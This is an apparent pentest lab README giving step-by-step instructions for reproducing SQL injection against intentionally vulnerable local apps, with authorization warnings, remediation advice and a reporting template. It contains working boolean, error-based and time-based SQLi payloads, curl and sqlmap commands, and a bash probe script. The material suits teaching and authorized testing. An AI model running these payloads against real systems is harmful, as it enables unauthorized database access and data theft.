# README-tests.md — Reproducing SQL Injection Findings

> **Purpose:** step-by-step, **safe** instructions to reproduce the SQL Injection notes recorded in `SQL Injection.txt`. These steps are intended for use in a controlled lab environment only (local VMs, Docker containers, or intentionally vulnerable apps). **Do NOT** run these steps against systems you do not own or do not have written permission to test.

---

## Prerequisites

1. A safe testing environment. Recommended options:

   * A local VM (VirtualBox / VMware) with an intentionally vulnerable app (DVWA, bWAPP) installed.
   * Dockerized vulnerable app (OWASP Juice Shop or DVWA via Docker).
   * Isolated network with no external access.
2. Tools installed on your attacker machine (can be the same VM):

   * Burp Suite (Community or Professional) or a proxy-capable browser extension
   * curl
   * sqlmap (for automated confirmation)
   * A modern web browser with developer tools
3. Backups / snapshots: take a VM snapshot so you can revert state after testing.

---

## Safety & Ethics (read this first)

* Only test systems that you own or that you have **explicit, written authorization** to test.
* Use a lab environment and ensure the target is not accessible from the public internet.
* Non-destructive validation first: prefer techniques that confirm vulnerability without extracting sensitive data.

---

## Overview of the approach

1. Identify an input field or parameter that interacts with the backend database (login forms, search fields, ID parameters in URLs).
2. Perform input discovery with benign probes (e.g., quote characters) to detect unusual responses or errors.
3. Use controlled payloads that reveal server behavior (error-based or boolean-based techniques).
4. Confirm using an automated tool (sqlmap) against the lab target with safe flags.
5. Document exact requests, server responses, evidence, and remediation suggestions.

---

## Step-by-step reproduction (manual)

### 1) Locate the candidate input

* Open the target in your lab (e.g., DVWA login page at `http://localhost/dvwa/login.php`).
* Interact with the application and identify parameters that reach the backend DB (form fields, `id` in the URL, search query fields).

### 2) Baseline behavior

* Submit normal input and observe expected behavior (successful login, search results).
* Capture a request in Burp or browser DevTools so you can replay and modify requests.

### 3) Simple quote probe

* Insert a single quote (`'`) into the input and observe the response.
* Example (login form username): `admin'`

**Expected observations**

* If the server returns a SQL error, or a different error page, this suggests the input is used in a query without proper escaping.
* If the application behaves the same, it may still be vulnerable (parameterized queries or error suppression can mask errors).

### 4) Boolean-based test (blind SQLi)

* Use a boolean condition that should be true or false and observe differences.
* Example payloads for a search or ID parameter:

  * `1' OR '1'='1` — typically causes the condition to always be true.
  * `1' AND '1'='2` — condition always false.
* Compare responses (difference in returned content length, result set, status code).

**How to test with curl (example GET)**

```bash
curl -i "http://localhost/app/search.php?q=normal"
curl -i "http://localhost/app/search.php?q=1'%20OR%20'1'='1"
curl -i "http://localhost/app/search.php?q=1'%20AND%20'1'='2"
```

### 5) Error-based test (if errors are shown)

* Inject payloads that produce database errors revealing structure (only in a lab):

  * `"' OR 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--` (database-specific and destructive if misused)
* **Warning:** Do **not** run destructive payloads on production. Use only in isolated lab environments.

### 6) Time-based blind SQLi (when responses do not reveal differences)

* Use time delays to detect injection points by making the DB sleep during query evaluation.
* Example (MySQL): `1' AND IF(1=1, SLEEP(5), 0) --`
* Measure response time differences to confirm injection.

---

## Confirm automatically with sqlmap (non-destructive mode)

**Important:** run sqlmap only against lab targets and use `--batch` and `--level/--risk` as needed. Start with `--technique=E,B` (error and boolean) to avoid risky actions.

Example (testing a GET parameter `id` on a local target):

```bash
sqlmap -u "http://localhost/vuln.php?id=1" --batch --level=1 --risk=1 --technique=BE --threads=1 --random-agent
```

If you have a POST form captured in Burp (use `--data`):

```bash
sqlmap -u "http://localhost/login.php" --data="username=admin&password=pass" --batch --level=1 --risk=1 --technique=BE
```

**Options of interest (safe-first):**

* `--batch` — non-interactive (accepts defaults)
* `--technique` — limit techniques (E=error, B=boolean, T=time, S=stacked queries) — start with `BE`.
* `--risk` and `--level` — keep low while confirming.

---

## Evidence to collect

For each confirmed finding, record:

* Target URL and the exact request (headers and body) captured in Burp/DevTools.
* The exact payload used to confirm the issue.
* Response differences (HTTP status, response body snippet, timing differences).
* Screenshots of Burp request/response and any error messages.
* sqlmap output (save to a file) if used: `--output-dir=reports/sqlmap/`.

---

## Recommended remediation (summary)

1. Use parameterized queries / prepared statements for all database access.
2. Apply strict input validation and output encoding for web contexts.
3. Implement least-privileged DB accounts — app DB accounts should not have excessive rights.
4. Disable verbose database error messages in production; log errors server-side.
5. Apply Web Application Firewall (WAF) as a compensating control while fixing code.

---

## Example non-destructive script (save as `scripts/check_sql_injection.sh` in repo)

This script performs a simple, non-destructive boolean probe against a GET parameter and records response lengths. Use in a lab only.

```bash
#!/usr/bin/env bash
# Usage: ./check_sql_injection.sh "http://localhost/vuln.php?id="
TARGET="$1"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target_prefix> (e.g. 'http://localhost/vuln.php?id=')"
  exit 1
fi

NORMAL=$(curl -s "${TARGET}1" | wc -c)
TRUEPAYLOAD=$(curl -s "${TARGET}1'%20OR%20'1'='1" | wc -c)
FALSEPAYLOAD=$(curl -s "${TARGET}1'%20AND%20'1'='2" | wc -c)

echo "Normal length: $NORMAL"
echo "True payload length: $TRUEPAYLOAD"
echo "False payload length: $FALSEPAYLOAD"

if [ "$TRUEPAYLOAD" != "$FALSEPAYLOAD" ]; then
  echo "Possible SQL injection: response lengths differ."
else
  echo "No obvious difference from this simple test."
fi
```

---

## Reporting template (what to include in your report)

* Title: SQL Injection — [target endpoint]
* Severity: (Low / Medium / High) — justify based on data exposure
* Description & impact: what data can be leaked or actions possible
* Proof-of-concept: exact request and response snippets
* Repro steps: concise steps to reproduce (link to this README-tests.md)
* Mitigation: actionable steps (parameterized queries, input validation)
* Artifacts: screenshots, Burp export, sqlmap logs

---

## Additional notes

* If you're unsure about a payload, test it locally in an isolated environment first.
* When automating, log everything and run at low concurrency to avoid destabilizing the target.

---

*Prepared for the HacktifyTests repository. Created for educational and authorized testing use only.*
